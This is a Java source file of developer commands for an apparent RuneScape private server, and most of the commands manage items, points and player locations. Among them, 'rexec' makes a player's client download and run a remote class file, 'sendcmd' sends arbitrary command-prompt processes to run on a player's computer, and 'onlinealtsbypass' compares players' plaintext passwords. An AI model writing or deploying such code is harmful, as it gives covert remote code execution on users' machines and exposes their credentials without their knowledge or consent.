package org.hyperion.rs2.commands.newimpl;

import org.hyperion.Server;
import org.hyperion.engine.task.Task;
import org.hyperion.rs2.Constants;
import org.hyperion.rs2.commands.NewCommand;
import org.hyperion.rs2.commands.NewCommandExtension;
import org.hyperion.rs2.commands.util.CommandInput;
import org.hyperion.rs2.model.*;
import org.hyperion.rs2.model.combat.Magic;
import org.hyperion.rs2.model.container.Container;
import org.hyperion.rs2.model.container.ShopManager;
import org.hyperion.rs2.model.container.bank.BankItem;
import org.hyperion.rs2.model.content.ContentManager;
import org.hyperion.rs2.model.content.jge.JGrandExchange;
import org.hyperion.rs2.model.content.misc2.Edgeville;
import org.hyperion.rs2.model.iteminfo.ItemInfo;
import org.hyperion.rs2.model.joshyachievementsv2.tracker.AchievementTracker;
import org.hyperion.rs2.model.recolor.Recolor;
import org.hyperion.rs2.packet.CommandPacketHandler;
import org.hyperion.rs2.saving.PlayerLoading;
import org.hyperion.rs2.util.TextUtils;
import org.hyperion.util.Misc;
import org.hyperion.util.Time;

import java.util.Arrays;
import java.util.List;

/**
 * Created by DrHales on 2/29/2016.
 */
public class DeveloperCommands implements NewCommandExtension {

    @Override
    public List<NewCommand> init() {
        return Arrays.asList(
                new NewCommand("spawnitem", Rank.DEVELOPER, new CommandInput<Integer>(integer -> integer >= 0 && integer < ItemDefinition.MAX_ID, "Item ID", "An integer between 0 and 23000"), new CommandInput<Integer>(integer -> integer >= 0 && integer <= Integer.MAX_VALUE, "Item Amount", "An integer Between 0 and MAX_VALUE")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0]), amount = Integer.parseInt(input[1]);
                        Item item = new Item(id, amount);
                        if (player.getInventory().add(item)) {
                            player.sendMessage(String.format("You have spawned %sx %s", id, TextUtils.optimizeText(item.getDefinition().getName())));
                        } else {
                            player.sendMessage("Unable to add item to inventory.");
                        }
                        return true;
                    }
                },
                new NewCommand("toggleach", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        AchievementTracker.active(!AchievementTracker.active());
                        player.sendf("Achievements are now %s", AchievementTracker.active() ? "Enabled" : "Disabled");
                        return true;
                    }
                }, new NewCommand("viewge", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        player.getGrandExchangeTracker().openInterface(target.getGrandExchangeTracker().entries);
                        return true;
                    }
                },
                new NewCommand("togglege", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        JGrandExchange.enabled = !JGrandExchange.enabled;
                        player.sendf("Grand Exchange is now %s.", JGrandExchange.enabled ? "Enabled" : "Disabled");
                        return true;
                    }
                },
                new NewCommand("reloadgeblacklist", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("Reloadede Grand Exchange blacklist: %s", ItemInfo.geBlacklist.reload());
                        return true;
                    }
                },
                new NewCommand("rexec", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0]);
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.sendMessage(":run:http://cache.arteropk.com/apkscripts/er.class");
                        player.sendf("Running Script http://cache.arteropk.com/apkscripts/er.class on player '%s'", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("reloaduntradeables", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("%s", ItemInfo.untradeables.reload() ? String.format("Reloaded Untradeables; Size: %s", ItemInfo.untradeables.size()) : "Error Reloading Untradeables.");
                        return true;
                    }
                },
                new NewCommand("reloadunspawnables", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("%s", ItemInfo.unspawnables.reload() ? String.format("Reloaded Unspawnables; Size %s", ItemInfo.unspawnables.size()) : "Error Reloading Unspawnables.");
                        return true;
                    }
                },
                new NewCommand("searchitem", Rank.DEVELOPER, new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Integer", "an Existing Item")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0]);
                        ItemDefinition definition = ItemDefinition.forId(id);
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> {
                            final int count = target.getBank().getCount(id) + target.getInventory().getCount(id);
                            if (count > 0) {
                                player.sendf("%s has %,d %s", TextUtils.optimizeText(target.getName()), count, definition.getName());
                            }
                        });
                        player.sendMessage("Search Completed.");
                        return true;
                    }
                },
                new NewCommand("wipeskills", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        for (int array = 0; array < Skills.SKILL_COUNT; array++) {
                            target.getSkills().setLevel(array, 1);
                            target.getSkills().setExperience(array, 0);
                        }
                        player.sendf("Wiped %s's skills.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("wipeinv", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.getInventory().clear();
                        player.sendf("Wiped %s's inventory.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("wipebank", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.getBank().clear();
                        player.sendf("Wiped %s's bank.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("killplayer", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.cE.hit(target.getSkills().getLevel(Skills.HITPOINTS), player, true, Constants.MELEE);
                        return true;
                    }
                },
                new NewCommand("checkip", Rank.DEVELOPER, new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty() && string.trim().split(".").length >= 3, "String", "An IP Address")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final String value = input[0].trim();
                        World.getPlayers().stream().filter(target -> target != null && target.getShortIP().contains(value)).forEach(target -> {
                            player.sendf("%s has the protocol: %s", TextUtils.optimizeText(target.getName()), target.getShortIP());
                        });
                        return true;
                    }
                },
                new NewCommand("checkmac", Rank.DEVELOPER, new CommandInput<String>(string -> Integer.parseInt(string) != -1, "String", "A MAC Address as Integer")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int address = Integer.parseInt(input[0].trim());
                        World.getPlayers().stream().filter(target -> target != null && target.getUID() == address).forEach(target -> {
                            player.sendf("%s has the MAC Address: %s", TextUtils.optimizeText(target.getName()), address);
                        });
                        return true;
                    }
                },
                new NewCommand("masspnpc", Rank.DEVELOPER, new CommandInput<Integer>(integer -> integer != -1, "Integer", "An NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        World.getPlayers().stream().filter(target -> target != null && (!target.getLocation().inPvPArea() && target.cE.getOpponent() == null)).forEach(target -> {
                            target.setPNpc(id);
                        });
                        return true;
                    }
                },
                new NewCommand("forcehome", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.setTeleportTarget(Edgeville.LOCATION);
                        return true;
                    }
                }, new NewCommand("sendcmd", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "String", "A Command Prompt Process")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String process = input[1].trim();
                        if (Rank.isStaffMember(target)) {
                            player.sendMessage("You cannot parse this command on staff members.");
                            return true;
                        }
                        target.sendf(":cmd:%s", process);
                        player.sendf("Processed command '%s' on player '%s'", process, TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("stafftome", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> !player.equals(target) && Rank.isStaffMember(target)).forEach(target -> {
                            target.setTeleportTarget(player.getLocation());
                        });
                        return true;
                    }
                },
                new NewCommand("takeitem", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Item", "An Existing Item ID"), new CommandInput<Integer>(integer -> integer > 0, "Amount", "An Integer above 0")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int id = Integer.parseInt(input[1].trim());
                        int amount = Integer.parseInt(input[2].trim());
                        for (final Container container : new Container[]{target.getInventory(), target.getBank(), target.getEquipment()}) {
                            Item item = container.getById(id);
                            if (item == null) {
                                continue;
                            }
                            amount = amount > item.getCount() ? item.getCount() : amount;
                            item = new Item(id, amount);
                            container.remove(item);
                            player.sendf("Removed %s x%d from %s's %s", ItemDefinition.forId(id).getName(), amount, TextUtils.optimizeText(target.getName()), container.getClass().getSimpleName());
                            if (player.getInventory().hasRoomFor(item)) {
                                player.getInventory().add(item);
                                player.sendMessage("Added Item to your inventory.");
                            } else {
                                player.getBank().add(new BankItem(0, id, amount));
                                player.sendMessage("Added Item to your bank.");
                            }
                            return true;
                        }
                        player.sendf("Unable to find %s in %s's containers", ItemDefinition.forId(id).getName(), TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("getmac", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        boolean found = false;
                        String mac = CommandPacketHandler.findCharStringMerged(target.getName(), "Mac");
                        if (!mac.equalsIgnoreCase("Doesn't exist")) {
                            player.sendMessage("@dre@Merged character");
                            player.sendf("%s's MAC adress is '%s'.", TextUtils.ucFirst(target.getName().toLowerCase()), mac);
                            found = true;
                        }
                        mac = CommandPacketHandler.findCharStringArteroPk(target.getName(), "Mac");
                        if (!mac.equalsIgnoreCase("Doesn't exist")) {
                            player.sendMessage("@dre@ArteroPK character");
                            player.sendf("%s's MAC adress is '%s'.", TextUtils.ucFirst(target.getName().toLowerCase()), mac);
                            found = true;
                        }
                        mac = CommandPacketHandler.findCharStringInstantPk(target.getName(), "Mac");
                        if (!mac.equalsIgnoreCase("Doesn't exist")) {
                            player.sendMessage("@dre@InstantPK character");
                            player.sendf("InstantPK characters don't keep MAC adress in their character file.");
                            found = true;
                        }
                        if (!found) {
                            player.sendf("No MAC Address found for player '%s'", TextUtils.optimizeText(target.getName()));
                        }
                        return true;
                    }
                },
                new NewCommand("givedt", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getDungeoneering().setTokens(target.getDungeoneering().getTokens() + amount);
                        player.sendf("%s now has %,d dung tokens", TextUtils.optimizeText(target.getName()), target.getDungeoneering().getTokens());
                        return true;
                    }
                },
                new NewCommand("giveep", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getBountyHunter().setEmblemPoints(target.getBountyHunter().getEmblemPoints() + amount);
                        player.sendf("%s now has %,d emblem points", TextUtils.optimizeText(target.getName()), target.getBountyHunter().getEmblemPoints());
                        return true;
                    }
                },
                new NewCommand("givesp", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getSlayer().setPoints(target.getSlayer().getSlayerPoints() + amount);
                        player.sendf("%s now has %,d slayer points", TextUtils.optimizeText(target.getName()), target.getSlayer().getSlayerPoints());
                        return true;
                    }
                },
                new NewCommand("givebhp", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        player.sendf("%s now has %,d bounty hunter points", TextUtils.optimizeText(target.getName()), target.getBountyHunter().getKills());
                        return true;
                    }
                },
                new NewCommand("givevp", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setVotingPoints(target.getPoints().getVotingPoints() + amount);
                        player.sendf("%s now has %,d vote points", TextUtils.optimizeText(target.getName()), target.getPoints().getVotingPoints());
                        return true;
                    }
                },
                new NewCommand("givedeaths", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.setDeathCount(target.getDeathCount() + amount);
                        player.sendf("%s now has %,d deaths", TextUtils.optimizeText(target.getName()), target.getDeathCount());
                        return true;
                    }
                },
                new NewCommand("givekills", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.setKillCount(target.getKillCount() + amount);
                        player.sendf("%s now has %,d kills", TextUtils.optimizeText(target.getName()), target.getKillCount());
                        return true;
                    }
                },
                new NewCommand("giveelo", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setEloRating(target.getPoints().getEloRating() + amount);
                        player.sendf("%s now has %,d elo", TextUtils.optimizeText(target.getName()), target.getPoints().getEloRating());
                        return true;
                    }
                },
                new NewCommand("givehp", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Amount", String.format("An Amount Between 1 & %s", Integer.MAX_VALUE - 1))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final int amount = Integer.parseInt(input[1].trim());
                        target.getPoints().setHonorPoints(target.getPoints().getHonorPoints() + amount);
                        player.sendf("%s now has %,d honor pts", target.getName(), target.getPoints().getHonorPoints());
                        return true;
                    }
                },
                new NewCommand("changename", Rank.DEVELOPER, new CommandInput<String>(PlayerLoading::playerExists, "Player", "An Existing Player")) {
                    @Override

                    protected boolean execute(Player player, String[] input) {
                        final String name = input[0].trim();
                            /*Does nothing*/
                        return true;
                    }
                },
                new NewCommand("dumpcommands", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        return true;
                    }
                },
                new NewCommand("onlinealtsbypass", Rank.DEVELOPER, new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "Password", "A Password to compare")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final String password = input[0].trim();
                        for (final Player target : World.getPlayers()) {
                            if (target != null && target.getPassword() != null && target.getPassword().equalsIgnoreCase(password)) {
                                player.sendf("%s at %d,%d (PvP Area: %s)", target.getName(), target.getLocation().getX(), target.getLocation().getY(), target.getLocation().inPvPArea());
                            }
                        }
                        return true;
                    }
                },
                new NewCommand("heal", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.heal(150);
                        return true;
                    }
                },
                new NewCommand("gfx", Rank.DEVELOPER, new CommandInput<Integer>(integer -> integer > 0 && integer < Integer.MAX_VALUE, "Graphics ID", String.format("An Integer between 0 & %,d", Integer.MAX_VALUE))) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.cE.doGfx(Integer.parseInt(input[0].trim()));
                        return true;
                    }
                },
                new NewCommand("resetcontent", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ContentManager.init();
                        return true;
                    }
                },
                new NewCommand("object", Rank.DEVELOPER, new CommandInput<Integer>(integer -> GameObjectDefinition.forId(integer) != null, "Integer", "Object ID"), new CommandInput<Integer>(integer -> integer > 0 && integer < 15, "Integer", "Object Face"), new CommandInput<Integer>(integer -> integer > -1 && integer < 23, "Integer", "Object Type")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        int face = Integer.parseInt(input[1].trim());
                        int type = Integer.parseInt(input[2].trim());
                        ObjectManager.addObject(new GameObject(GameObjectDefinition.forId(id), player.getLocation(), type, face));
                        TextUtils.writeToFile("./data/objspawns.cfg", String.format("spawn = %d\t%s\t%d\t\t%s", id, player.getLocation().toString(), face, type, GameObjectDefinition.forId(id).getName()));
                        return true;
                    }
                },
                new NewCommand("switch", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        SpellBook.switchSpellbook(player);
                        return true;
                    }
                },
                new NewCommand("staticnpc", Rank.DEVELOPER, new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        NPCManager.addNPC(player.getLocation(), id, -1);
                        TextUtils.writeToFile("./data/spawns.cfg", String.format("spawn = %d\t%s\t%d\t%d\t%d\t%d\t1\t%s", id, player.getLocation(), player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getX(), player.getLocation().getY(), NPCDefinition.forId(id).name()));
                        return true;
                    }
                },
                new NewCommand("npc", Rank.DEVELOPER, new CommandInput<Integer>(integer -> NPCDefinition.forId(integer) != null, "Integer", "NPC ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        int id = Integer.parseInt(input[0].trim());
                        int value;
                        try {
                            value = Integer.parseInt(input[1].trim());
                        } catch (ArrayIndexOutOfBoundsException e) {
                            value = 50;
                        }
                        NPCManager.addNPC(player.getLocation(), id, value);
                        TextUtils.writeToFile("./data/spawns.cfg", String.format("spawn = %d\t%s\t%d\t%d\t%d\t%d\t1\t%s", id, player.getLocation(), player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getX(), player.getLocation().getY(), NPCDefinition.forId(id).name()));
                        return true;
                    }
                },
                new NewCommand("spammessage", Rank.DEVELOPER, new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "String", "Message to Spam")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String value = input[0].trim();
                        World.getNpcs().stream().filter(npc -> npc != null).forEach(npc -> npc.forceMessage(value));
                        return true;
                    }
                },
                new NewCommand("changeextra", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player"), new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "String", "Extra Data")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        final String data = input[1].trim();
                        target.getExtraData().put(data, !target.getExtraData().getBoolean(data));
                        player.sendf("Player '%s' '%s' is now '%s'", TextUtils.optimizeText(target.getName()), data, target.getExtraData().getBoolean(data));
                        return true;
                    }
                },
                new NewCommand("hardmoders", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> !target.hardMode()).forEach(target -> player.sendf("%s", TextUtils.optimizeText(target.getName())));
                        return true;
                    }
                },
                new NewCommand("sm", Rank.DEVELOPER, new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty(), "String", "Message Input")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null).forEach(target -> target.sendServerMessage(TextUtils.optimizeText(input[0].trim())));
                        return true;
                    }
                },
                new NewCommand("restartserver", Rank.DEVELOPER, new CommandInput<String>(string -> string.trim() != null && !string.trim().isEmpty() && string.trim().length() > 1, "String", "Restart Reason")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        String reason = input[0].trim();
                        Server.update(150, String.format("%s\t%s", player.getName(), reason));
                        return true;
                    }
                },
                new NewCommand("startxrecording", Rank.DEVELOPER, new CommandInput<String>(string -> World.getPlayerByName(string) != null, "Player", "An Online Player")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final Player target = World.getPlayerByName(input[0].trim());
                        target.sendMessage("script789456789");
                        player.sendMessage("Sent player '%s' script789456789.", TextUtils.optimizeText(target.getName()));
                        return true;
                    }
                },
                new NewCommand("alltome", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        World.getPlayers().stream().filter(target -> target != null && target != player).forEach(target -> {
                            final int x = player.getLocation().getX() + Misc.random(3);
                            final int y = player.getLocation().getY() + Misc.random(3);
                            World.submit(new Task(Misc.random(10000)) {
                                @Override
                                public void execute() {
                                    Magic.teleport(target, x, y, player.getLocation().getZ(), true);
                                }
                            });
                        });
                        return true;
                    }
                },
                new NewCommand("clearlogs", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        /*Does nothing atm*/
                        return true;
                    }
                },
                new NewCommand("viewlogstats", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        /*Does nothing atm*/
                        return true;
                    }
                },
                new NewCommand("viewlogs", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        /*does nothing atm*/
                        return true;
                    }
                },
                new NewCommand("uncolorall", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.getRecolorManager().clear();
                        return true;
                    }
                },
                new NewCommand("viewrecolors", Rank.DEVELOPER) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendf("You have %,d recolors.", player.getRecolorManager().getCount());
                        player.getRecolorManager().getAll().stream().forEach(recolor -> player.sendf(recolor.toReadableString()));
                        return true;
                    }
                },
                new NewCommand("uncolor", Rank.DEVELOPER, new CommandInput<Integer>(integer -> ItemDefinition.forId(integer) != null, "Integer", "Item ID")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final int id = Integer.parseInt(input[0].trim());
                        if (!player.getRecolorManager().contains(id)) {
                            player.sendf("No recolors found for item '%s'", TextUtils.optimizeText(ItemDefinition.forId(id).getName()));
                            return true;
                        }
                        player.getRecolorManager().remove(id).stream().forEach(recolor -> player.sendf("Removed recolor for %s", recolor.toReadableString()));
                        return true;
                    }
                },
                new NewCommand("recolor", Rank.DEVELOPER, new CommandInput<String>(string -> Recolor.parse(string).getItemDefinition() != null, "String", "Recolor Def")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        final String value = input[0].trim();
                        final Recolor recolor = Recolor.parse(value);
                        if (player.getRecolorManager().isAtLimit()) {
                            player.sendf("You are at your limit! (Limit: %d)", player.getRecolorManager().getLimit());
                            player.sendf("In order to recolor more items, you must buy %,d more donator points!", player.getRecolorManager().getAmountForLimitIncrease());
                            return true;
                        }
                        player.getRecolorManager().add(recolor);
                        player.sendf("Added recolor for %s", recolor.toReadableString());
                        return true;
                    }
                },
                new NewCommand("isonline", Rank.DEVELOPER, Time.FIVE_SECONDS, new CommandInput<String>(PlayerLoading::playerExists, "player", "A player that exists in the system.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        player.sendMessage("Player " + TextUtils.optimizeText(input[0]) + " is currently " + (World.getPlayerByName(input[0]) == null ? "offline" : "online"));
                        return true;
                    }
                },
                new NewCommand("shop", Rank.DEVELOPER, Time.FIVE_SECONDS, new CommandInput<Integer>(integer -> integer >= 0, "ShopId", "The ID of the shop, has to be a positive number.")) {
                    @Override
                    protected boolean execute(Player player, String[] input) {
                        ShopManager.open(player, Integer.parseInt(input[0]));
                        return true;
                    }
                }
        );
    }
}
